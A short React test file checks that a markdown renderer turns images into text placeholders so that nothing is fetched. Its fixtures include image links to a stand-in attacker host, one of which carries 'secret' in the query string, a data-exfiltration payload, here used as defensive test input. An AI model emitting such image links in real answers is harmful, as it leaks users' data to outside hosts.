import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import ReactMarkdown from "react-markdown";
import { withoutImages } from "./answerMarkdown";

describe("answer markdown", () => {
  it("never renders an img element, so nothing is fetched", () => {
    const { container } = render(
      <ReactMarkdown components={withoutImages()}>{"before ![chart](https://evil.test/p.png?q=secret) after"}</ReactMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[Image: chart]");
    expect(container.innerHTML).not.toContain("evil.test");
  });

  it("shows a bare image as plain text and keeps the other overrides", () => {
    const { container } = render(
      <ReactMarkdown components={withoutImages({ h1: ({ children }) => <h3 data-x>{children}</h3> })}>
        {"# T\n\n![](https://evil.test/a.png)"}
      </ReactMarkdown>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("[Image]");
    expect(container.querySelector("h3[data-x]")).not.toBeNull();
  });
});
